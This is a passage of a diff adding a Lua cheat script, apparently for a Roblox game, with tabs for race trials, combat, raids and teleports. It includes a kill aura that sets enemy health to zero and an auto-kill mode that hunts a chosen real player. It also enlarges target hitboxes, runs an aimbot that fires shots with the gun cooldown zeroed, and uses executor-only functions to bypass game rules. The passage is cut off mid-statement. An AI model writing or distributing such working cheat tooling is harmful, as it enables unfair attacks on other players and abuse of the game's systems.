+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 120, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.2);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 99, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 99, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+							end;
+						end;
+					elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Cyborg" then
+						topos(CFrame.new(28654, 14898.7832, -30, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+					elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Ghoul" then
+						for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								pcall(function()
+									repeat
+										wait(0.1);
+										v.Humanoid.Health = 0;
+										v.HumanoidRootPart.CanCollide = false;
+										sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge);
+									until not _G.AutoQuestRace or (not v.Parent) or v.Humanoid.Health <= 0;
+								end);
+							end;
+						end;
+					elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Mink" then
+						for i, v in pairs((game:GetService("Workspace")):GetDescendants()) do
+							if v.Name == "StartPoint" then
+								topos(v.CFrame * CFrame.new(0, 10, 0));
+							end;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end);
+	RaceV4Tab:Button("Auto Complete Angel Trial", function(t)
+		topos(game.Workspace.Map.SkyTrial.Model.FinishPart.CFrame);
+	end);
+	RaceV4Tab:Button("Auto Complete Rabbit Trial", function(t)
+		topos((game:GetService("Workspace")).Map.MinkTrial.Ceiling.CFrame * CFrame.new(0, (-5), 0));
+	end);
+	RaceV4Tab:Button("Auto Complete Cyborg Trial", function(t)
+		topos(CFrame.new(0, 300, 0));
+	end);
+end;
+spawn(function()
+	while wait() do
+		if _G.AutoKillTial then
+			for i, v in pairs((game:GetService("Players")):GetChildren()) do
+				if v.Name and v.Name ~= game.Players.LocalPlayer.Name and (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
+					if v.Character.Humanoid.Health > 0 then
+						repeat
+							wait(_G.FastAttackDelay);
+							EquipWeapon(_G.SelectWeapon);
+							AutoHaki();
+							topos(v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5));
+							v.Character.HumanoidRootPart.CanCollide = false;
+							v.Character.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
+							AttackNoCD();
+						until not _G.AutoKillTial or (not v.Parent) or v.Humanoid.Health <= 0;
+					end;
+				end;
+			end;
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if UseskillKill then
+				(game:GetService("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+				wait(0.1);
+				(game:GetService("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+				wait(0.1);
+				(game:GetService("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+				wait(0.1);
+				(game:GetService("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+				wait(0.1);
+				(game:GetService("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+				wait(0.1);
+				(game:GetService("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+				wait(0.1);
+				(game:GetService("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+				wait(0.1);
+				(game:GetService("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+			end;
+		end);
+	end;
+end);
+CombatTab:Seperator("Combat");
+local plyserv = CombatTab:Label("Players");
+spawn(function()
+	while wait() do
+		pcall(function()
+			for i, v in pairs((game:GetService("Players")):GetPlayers()) do
+				if i == 12 then
+					plyserv:Set("Players :" .. " " .. i .. " " .. "/" .. " " .. "12" .. " " .. "(Max)");
+				elseif i == 1 then
+					plyserv:Set("Player :" .. " " .. i .. " " .. "/" .. " " .. "12");
+				else
+					plyserv:Set("Players :" .. " " .. i .. " " .. "/" .. " " .. "12");
+				end;
+			end;
+		end);
+	end;
+end);
+Playerslist = {};
+for i, v in pairs((game:GetService("Players")):GetChildren()) do
+	table.insert(Playerslist, v.Name);
+end;
+local SelectedPly = CombatTab:Dropdown("Select Player", Playerslist, false, function(value)
+	_G.SelectPly = value;
+end);
+CombatTab:Button("Refresh Player", function()
+	Playerslist = {};
+	SelectedPly:Clear();
+	for i, v in pairs((game:GetService("Players")):GetChildren()) do
+		SelectedPly:Add(v.Name);
+	end;
+end);
+CombatTab:Toggle("Spectate Player", false, "Change Camera Player", function(value)
+	SpectatePlys = value;
+	local plr1 = (game:GetService("Players")).LocalPlayer.Character.Humanoid;
+	local plr2 = (game:GetService("Players")):FindFirstChild(_G.SelectPly);
+	repeat
+		wait(0.1);
+		(game:GetService("Workspace")).Camera.CameraSubject = ((game:GetService("Players")):FindFirstChild(_G.SelectPly)).Character.Humanoid;
+	until SpectatePlys == false;
+	(game:GetService("Workspace")).Camera.CameraSubject = (game:GetService("Players")).LocalPlayer.Character.Humanoid;
+end);
+CombatTab:Toggle("Teleport To Player", false, "Tween To Players", function(value)
+	_G.TeleportPly = value;
+	pcall(function()
+		if _G.TeleportPly then
+			repeat
+				topos((game:GetService("Players"))[_G.SelectPly].Character.HumanoidRootPart.CFrame);
+				wait();
+			until _G.TeleportPly == false;
+		end;
+		StopTween(_G.TeleportPly);
+	end);
+end);
+CombatTab:Toggle("Auto Farm Player", false, "Auto Kill Players", function(value)
+	_G.Auto_Kill_Ply = value;
+	StopTween(_G.Auto_Kill_Ply);
+end);
+spawn(function()
+	while wait() do
+		if _G.Auto_Kill_Ply then
+			pcall(function()
+				if _G.SelectPly ~= nil then
+					if game.Players:FindFirstChild(_G.SelectPly) then
+						if (game.Players:FindFirstChild(_G.SelectPly)).Character.Humanoid.Health > 0 then
+							repeat
+								task.wait();
+								EquipWeapon(_G.SelectWeapon);
+								AutoHaki();
+								(game.Players:FindFirstChild(_G.SelectPly)).Character.HumanoidRootPart.CanCollide = false;
+								topos((game.Players:FindFirstChild(_G.SelectPly)).Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0));
+								spawn(function()
+									pcall(function()
+										if _G.SelectWeapon == SelectWeaponGun then
+											local args = {
+												[1] = (game.Players:FindFirstChild(_G.SelectPly)).Character.HumanoidRootPart.Position,
+												[2] = (game.Players:FindFirstChild(_G.SelectPly)).Character.HumanoidRootPart
+											};
+											(game:GetService("Players")).LocalPlayer.Character[SelectWeaponGun].RemoteFunctionShoot:InvokeServer(unpack(args));
+										else
+											(game:GetService("VirtualUser")):CaptureController();
+											(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+										end;
+									end);
+								end);
+							until (game.Players:FindFirstChild(_G.SelectPly)).Character.Humanoid.Health <= 0 or (not game.Players:FindFirstChild(_G.SelectPly)) or (not _G.Auto_Kill_Ply);
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+CombatTab:Seperator("Quest Player");
+CombatTab:Button("Get Quest Elite Players", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("PlayerHunter");
+end);
+CombatTab:Toggle("Auto Kill Player Quest", _G.AutoPlayerHunter, "Auto Player Quest", function(Killzps)
+	_G.AutoPlayerHunter = Killzps;
+	StopTween(_G.AutoPlayerHunter);
+end);
+spawn(function()
+	(game:GetService("RunService")).Heartbeat:connect(function()
+		pcall(function()
+			if _G.AutoPlayerHunter then
+				if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Humanoid") then
+					(game:GetService("Players")).LocalPlayer.Character.Humanoid:ChangeState(11);
+				end;
+			end;
+		end);
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.AutoPlayerHunter then
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.PvpDisabled.Visible == true then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EnablePvp");
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoPlayerHunter then
+			if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+				wait(0.5);
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("PlayerHunter");
+			else
+				for i, v in pairs((game:GetService("Workspace")).Characters:GetChildren()) do
+					if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, v.Name) then
+						repeat
+							wait();
+							AutoHaki();
+							EquipWeapon(_G.SelectWeapon);
+							Useskill = true;
+							topos(v.HumanoidRootPart.CFrame * CFrame.new(1, 7, 3));
+							v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
+							(game:GetService("VirtualUser")):CaptureController();
+							(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+						until _G.AutoPlayerHunter == false or v.Humanoid.Health <= 0;
+						Useskill = false;
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+					end;
+				end;
+			end;
+		end;
+	end;
+end);
+CombatTab:Seperator("Aimbot");
+spawn(function()
+	while wait() do
+		pcall(function()
+			local MaxDistance = math.huge;
+			for i, v in pairs((game:GetService("Players")):GetPlayers()) do
+				if v.Name ~= (game:GetService("Players")).LocalPlayer.Name then
+					local Distance = v:DistanceFromCharacter((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position);
+					if Distance < MaxDistance then
+						MaxDistance = Distance;
+						PlayerSelectAimbot = v.Name;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+CombatTab:Toggle("Aimbot Gun", false, "Aimbot Skill Gun", function(value)
+	_G.Aimbot_Gun = value;
+end);
+spawn(function()
+	while task.wait() do
+		if _G.Aimbot_Gun and (game:GetService("Players")).LocalPlayer.Character:FindFirstChild(SelectWeaponGun) then
+			pcall(function()
+				(game:GetService("Players")).LocalPlayer.Character[SelectWeaponGun].Cooldown.Value = 0;
+				local args = {
+					[1] = ((game:GetService("Players")):FindFirstChild(PlayerSelectAimbot)).Character.HumanoidRootPart.Position,
+					[2] = ((game:GetService("Players")):FindFirstChild(PlayerSelectAimbot)).Character.HumanoidRootPart
+				};
+				(game:GetService("Players")).LocalPlayer.Character[SelectWeaponGun].RemoteFunctionShoot:InvokeServer(unpack(args));
+				(game:GetService("VirtualUser")):CaptureController();
+				(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+			end);
+		end;
+	end;
+end);
+CombatTab:Toggle("Aimbot Skill Nearest", false, "Aim Bot Skill Nearest", function(v)
+	AimSkillNearest = v;
+end);
+spawn(function()
+	while wait(0.1) do
+		pcall(function()
+			local MaxDistance = math.huge;
+			for i, v in pairs((game:GetService("Players")):GetPlayers()) do
+				if v.Name ~= game.Players.LocalPlayer.Name then
+					local Distance = v:DistanceFromCharacter(game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
+					if Distance < MaxDistance then
+						MaxDistance = Distance;
+						TargetPlayerAim = v.Name;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	pcall(function()
+		(game:GetService("RunService")).RenderStepped:connect(function()
+			if AimSkillNearest and TargetPlayerAim ~= nil and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and game.Players.LocalPlayer.Character[(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")).Name]:FindFirstChild("MousePos") then
+				local args = {
+					[1] = ((game:GetService("Players")):FindFirstChild(TargetPlayerAim)).Character.HumanoidRootPart.Position
+				};
+				(game:GetService("Players")).LocalPlayer.Character[(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")).Name].RemoteEvent:FireServer(unpack(args));
+			end;
+		end);
+	end);
+end);
+CombatTab:Toggle("Aimbot Skill", false, "Aimbot All Skill", function(value)
+	_G.Aimbot_Skill = value;
+end);
+spawn(function()
+	pcall(function()
+		while task.wait() do
+			if _G.Aimbot_Skill and PlayerSelectAimbot ~= nil and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and game.Players.LocalPlayer.Character[(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")).Name]:FindFirstChild("MousePos") then
+				local args = {
+					[1] = ((game:GetService("Players")):FindFirstChild(PlayerSelectAimbot)).Character.HumanoidRootPart.Position
+				};
+				((game:GetService("Players")).LocalPlayer.Character:FindFirstChild((game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")).Name)).RemoteEvent:FireServer(unpack(args));
+			end;
+		end;
+	end);
+end);
+CombatTab:Toggle("Enabled PvP", false, "Enable PvP", function(value)
+	_G.EnabledPvP = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.EnabledPvP then
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.PvpDisabled.Visible == true then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EnablePvp");
+				end;
+			end;
+		end;
+	end);
+end);
+CombatTab:Toggle("Safe Mode", false, "Auto Teleport To Up", function(value)
+	_G.Safe_Mode = value;
+	StopTween(_G.Safe_Mode);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.Safe_Mode then
+				(game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 200, 0);
+			end;
+		end;
+	end);
+end);
+CombatTab:Button("Respawn", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetTeam", "Pirates");
+	wait();
+end);
+RaidTab:Seperator("Raid");
+local TimeRaid = RaidTab:Label("Wait For Dungeon");
+local Island = RaidTab:Label("Start Dungeon");
+spawn(function()
+	pcall(function()
+		while wait() do
+			if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Timer.Visible == true then
+				TimeRaid:Set((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Timer.Text);
+			else
+				TimeRaid:Set("Wait For Dungeon");
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if game.Workspace._WorldOrigin.Locations:FindFirstChild("Island 5") then
+				Island:Set("🏝️ Island 5");
+			elseif game.Workspace._WorldOrigin.Locations:FindFirstChild("Island 4") then
+				Island:Set("🏝️ Island 4");
+			elseif game.Workspace._WorldOrigin.Locations:FindFirstChild("Island 3") then
+				Island:Set("🏝️ Island 3");
+			elseif game.Workspace._WorldOrigin.Locations:FindFirstChild("Island 2") then
+				Island:Set("🏝️ Island 2");
+			elseif game.Workspace._WorldOrigin.Locations:FindFirstChild("Island 1") then
+				Island:Set("🏝️ Island 1");
+			else
+				Island:Set("Start Dungeon");
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.Auto_Dungeon then
+				local RaidPos = CFrame.new(0, 25, 0);
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Timer.Visible == true then
+					if (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 5") then
+						topos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 5")).CFrame * RaidPos);
+					elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 4") then
+						topos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 4")).CFrame * RaidPos);
+					elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 3") then
+						topos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 3")).CFrame * RaidPos);
+					elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 2") then
+						topos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 2")).CFrame * RaidPos);
+					elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1") then
+						topos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1")).CFrame * RaidPos);
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.Kill_Aura then
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Timer.Visible == true then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetDescendants()) do
+						if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+							pcall(function()
+								repeat
+									wait();
+									sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+									v.Humanoid.Health = 0;
+									v.HumanoidRootPart.CanCollide = false;
+								until not _G.Kill_Aura or (not v.Parent) or v.Humanoid.Health <= 0;
+							end);
+						end;
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+_G.SelectChip = selectraids or "";
+Raidslist = {};
+RaidsModule = require(game.ReplicatedStorage.Raids);
+for i, v in pairs(RaidsModule.raids) do
+	table.insert(Raidslist, v);
+end;
+for i, v in pairs(RaidsModule.advancedRaids) do
+	table.insert(Raidslist, v);
+end;
+RaidTab:Dropdown("Select Chips", Raidslist, false, function(value)
+	_G.SelectChip = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoBuyChip then
+				if not (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Special Microchip") or (not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Special Microchip")) then
+					if not (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1") then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("RaidsNpc", "Select", _G.SelectChip);
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+RaidTab:Label("[ Automatic ]");
+RaidTab:Toggle("Start Raid", _G.Auto_StartRaid, "Start, Buy, Kill, Next, Awaken", function(value)
+	_G.Auto_StartRaid = value;
+	_G.Kill_Aura = value;
+	_G.AutoBuyChip = value;
+	_G.Auto_Dungeon = value;
+	_G.Awaken = value;
+	StopTween(_G.Auto_Dungeon);
+end);
+RaidTab:Label("[ Manually ]");
+RaidTab:Toggle("Auto Start Raid", _G.Auto_StartRaid, "Start Raid", function(x)
+	_G.Auto_StartRaid = x;
+end);
+RaidTab:Toggle("Kill Aura", _G.Kill_Aura, "Auto Kill Mob Area", function(x)
+	_G.Kill_Aura = x;
+end);
+RaidTab:Toggle("Auto Buy Chip", _G.AutoBuyChip, "Buy Microchip", function(x)
+	_G.AutoBuyChip = x;
+end);
+RaidTab:Toggle("Auto Next Island", _G.Auto_Dungeon, "Next Island", function(x)
+	_G.Auto_Dungeon = x;
+	StopTween(_G.Auto_Dungeon);
+end);
+RaidTab:Toggle("Auto Awaken", false, "Auto Awaken When Done Raid", function(value)
+	_G.Awaken = value;
+end);
+spawn(function()
+	while wait() do
+		if _G.Awaken then
+			pcall(function()
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Awakener", "Awaken");
+			end);
+		end;
+	end;
+end);
+_G.UnstoreFruitPrice = 1000000;
+RaidTab:Slider("Set Price Devil Fruit", 0, 10000000, _G.UnstoreFruitPrice, function(v)
+	_G.UnstoreFruitPrice = v;
+end);
+RaidTab:Toggle("Auto Unstore Fruit", false, "Unstore Devil Fruit", function(value)
+	_G.UnstoreBadFruit = value;
+end);
+function GetFruitsInfo()
+	for i, v in pairs((game:GetService("Players")).LocalPlayer.Backpack:GetChildren()) do
+		if string.find(v.Name, "Fruit") then
+			return true;
+		end;
+	end;
+	for i, v in pairs((game:GetService("Players")).LocalPlayer.Character:GetChildren()) do
+		if string.find(v.Name, "Fruit") then
+			return true;
+		end;
+	end;
+	return false;
+end;
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.UnstoreBadFruit then
+				fruit = (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("getInventoryFruits");
+				for i, v in pairs(fruit) do
+					if v.Price < _G.UnstoreFruitPrice then
+						if not GetFruitsInfo() then
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("LoadFruit", v.Name);
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait(0.1) do
+		pcall(function()
+			if _G.Auto_StartRaid then
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Timer.Visible == false then
+					if not (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1") and (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Special Microchip") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Special Microchip") then
+						if World2 then
+							fireclickdetector((game:GetService("Workspace")).Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector);
+						elseif World3 then
+							fireclickdetector((game:GetService("Workspace")).Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector);
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+if World2 then
+	RaidTab:Button("Teleport to Lab", function()
+		topos(CFrame.new(-6438.73535, 250.645355, -4501.50684));
+	end);
+elseif World3 then
+	RaidTab:Button("Teleport to Lab", function()
+		topos(CFrame.new(-5017.40869, 314.844055, -2823.0127, -0.925743818, 0.0000000448217499, -0.378151238, 0.00000000455503146, 1, 0.000000107377559, 0.378151238, 0.000000097681621, -0.925743818));
+	end);
+end;
+RaidTab:Seperator("Law Raid");
+RaidTab:Toggle("Auto Raid Law", _G.autoLawRaid, "Law Raid", function(state)
+	_G.autoLawRaid = state;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.autoLawRaid then
+				if not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Microchip") and (not (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Microchip")) and (not (game:GetService("Workspace")).Enemies:FindFirstChild("Order")) and (not (game:GetService("ReplicatedStorage")):FindFirstChild("Order")) then
+					wait(0.3);
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "1");
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2");
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.4) do
+			if _G.autoLawRaid then
+				if not (game:GetService("Workspace")).Enemies:FindFirstChild("Order") and (not (game:GetService("ReplicatedStorage")):FindFirstChild("Order")) then
+					if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Microchip") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Microchip") then
+						fireclickdetector((game:GetService("Workspace")).Map.CircleIsland.RaidSummon.Button.Main.ClickDetector);
+					end;
+				end;
+				if (game:GetService("ReplicatedStorage")):FindFirstChild("Order") or (game:GetService("Workspace")).Enemies:FindFirstChild("Order") then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Order") then
+						for h, i in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if i.Name == "Order" then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AttackNoCD();
+									FastAttack = true;
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									TP1(i.HumanoidRootPart.CFrame * pos);
+									i.HumanoidRootPart.CanCollide = false;
+									i.HumanoidRootPart.Size = Vector3.new(120, 120, 120);
+								until not i.Parent or i.Humanoid.Health <= 0 or Auto_Law == false;
+							end;
+						end;
+					elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Order") then
+						topos(CFrame.new(-6217.2021484375, 28.047645568848, -5053.1357421875));
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+TeleportTab:Seperator("World");
+TeleportTab:Button("Teleport To First Sea", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelMain");
+end);
+TeleportTab:Button("Teleport To Second Sea", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelDressrosa");
+end);
+TeleportTab:Button("Teleport To Third Sea", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelZou");
+end);
+TeleportTab:Seperator("Island");
+if World1 then
+	TeleportTab:Dropdown("Select Island", {
+		"WindMill",
+		"Marine",
+		"Middle Town",
+		"Jungle",
+		"Pirate Village",
+		"Desert",
+		"Snow Island",
+		"MarineFord",
+		"Colosseum",
+		"Sky Island 1",
+		"Sky Island 2",
+		"Sky Island 3",
+		"Prison",
+		"Magma Village",
+		"Under Water Island",
+		"Fountain City",
+		"Shank Room",
+		"Mob Island"
+	}, false, function(value)
+		_G.SelectIsland = value;
+	end);
+end;
+if World2 then
+	TeleportTab:Dropdown("Select Island", {
+		"The Cafe",
+		"Frist Spot",
+		"Dark Area",
+		"Flamingo Mansion",
+		"Flamingo Room",
+		"Green Zone",
+		"Factory",
+		"Colossuim",
+		"Zombie Island",
+		"Two Snow Mountain",
+		"Punk Hazard",
+		"Cursed Ship",
+		"Ice Castle",
+		"Forgotten Island",
+		"Ussop Island",
+		"Mini Sky Island"
+	}, false, function(value)
+		_G.SelectIsland = value;
+	end);
+end;
+if World3 then
+	TeleportTab:Dropdown("Select Island", {
+		"Mansion",
+		"Port Town",
+		"Great Tree",
+		"Castle On The Sea",
+		"MiniSky",
+		"Hydra Island",
+		"Floating Turtle",
+		"Haunted Castle",
+		"Ice Cream Island",
+		"Peanut Island",
+		"Cake Island",
+		"Cocoa Island",
+		"Candy Island",
+		"Tiki Outpost"
+	}, false, function(value)
+		_G.SelectIsland = value;
+	end);
+end;
+TeleportTab:Toggle("Teleport", false, "Tween To Island", function(value)
+	_G.TeleportIsland = value;
+	if _G.TeleportIsland == true then
+		repeat
+			wait();
+			if _G.SelectIsland == "WindMill" then
+				topos(CFrame.new(979.79895019531, 16.516613006592, 1429.0466308594));
+			elseif _G.SelectIsland == "Marine" then
+				topos(CFrame.new(-2566.4296875, 6.8556680679321, 2045.2561035156));
+			elseif _G.SelectIsland == "Middle Town" then
+				topos(CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094));
+			elseif _G.SelectIsland == "Jungle" then
+				topos(CFrame.new(-1612.7957763672, 36.852081298828, 149.12843322754));
+			elseif _G.SelectIsland == "Pirate Village" then
+				topos(CFrame.new(-1181.3093261719, 4.7514905929565, 3803.5456542969));
+			elseif _G.SelectIsland == "Desert" then
+				topos(CFrame.new(944.15789794922, 20.919729232788, 4373.3002929688));
+			elseif _G.SelectIsland == "Snow Island" then
+				topos(CFrame.new(1347.8067626953, 104.66806030273, -1319.7370605469));
+			elseif _G.SelectIsland == "MarineFord" then
+				topos(CFrame.new(-4914.8212890625, 50.963626861572, 4281.0278320313));
+			elseif _G.SelectIsland == "Colosseum" then
+				topos(CFrame.new(-1427.6203613281, 7.2881078720093, -2792.7722167969));
+			elseif _G.SelectIsland == "Sky Island 1" then
+				topos(CFrame.new(-4869.1025390625, 733.46051025391, -2667.0180664063));
+			elseif _G.SelectIsland == "Sky Island 2" then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-4607.82275, 872.54248, -1667.55688));
+			elseif _G.SelectIsland == "Sky Island 3" then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047));
+			elseif _G.SelectIsland == "Prison" then
+				topos(CFrame.new(4875.330078125, 5.6519818305969, 734.85021972656));
+			elseif _G.SelectIsland == "Magma Village" then
+				topos(CFrame.new(-5247.7163085938, 12.883934020996, 8504.96875));
+			elseif _G.SelectIsland == "Under Water Island" then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.8515625, 11.6796875, 1819.7841796875));
+			elseif _G.SelectIsland == "Fountain City" then
+				topos(CFrame.new(5127.1284179688, 59.501365661621, 4105.4458007813));
+			elseif _G.SelectIsland == "Shank Room" then
+				topos(CFrame.new(-1442.16553, 29.8788261, -28.3547478));
+			elseif _G.SelectIsland == "Mob Island" then
+				topos(CFrame.new(-2850.20068, 7.39224768, 5354.99268));
+			elseif _G.SelectIsland == "The Cafe" then
+				topos(CFrame.new(-380.47927856445, 77.220390319824, 255.82550048828));
+			elseif _G.SelectIsland == "Frist Spot" then
+				topos(CFrame.new(-11.311455726624, 29.276733398438, 2771.5224609375));
+			elseif _G.SelectIsland == "Dark Area" then
+				topos(CFrame.new(3780.0302734375, 22.652164459229, -3498.5859375));
+			elseif _G.SelectIsland == "Flamingo Mansion" then
+				topos(CFrame.new(-483.73370361328, 332.0383605957, 595.32708740234));
+			elseif _G.SelectIsland == "Flamingo Room" then
+				topos(CFrame.new(2284.4140625, 15.152037620544, 875.72534179688));
+			elseif _G.SelectIsland == "Green Zone" then
+				topos(CFrame.new(-2448.5300292969, 73.016105651855, -3210.6306152344));
+			elseif _G.SelectIsland == "Factory" then
+				topos(CFrame.new(424.12698364258, 211.16171264648, -427.54049682617));
+			elseif _G.SelectIsland == "Colossuim" then
+				topos(CFrame.new(-1503.6224365234, 219.7956237793, 1369.3101806641));
+			elseif _G.SelectIsland == "Zombie Island" then
+				topos(CFrame.new(-5622.033203125, 492.19604492188, -781.78552246094));
+			elseif _G.SelectIsland == "Two Snow Mountain" then
+				topos(CFrame.new(753.14288330078, 408.23559570313, -5274.6147460938));
+			elseif _G.SelectIsland == "Punk Hazard" then
+				topos(CFrame.new(-6127.654296875, 15.951762199402, -5040.2861328125));
+			elseif _G.SelectIsland == "Cursed Ship" then
+				topos(CFrame.new(923.40197753906, 125.05712890625, 32885.875));
+			elseif _G.SelectIsland == "Ice Castle" then
+				topos(CFrame.new(6148.4116210938, 294.38687133789, -6741.1166992188));
+			elseif _G.SelectIsland == "Forgotten Island" then
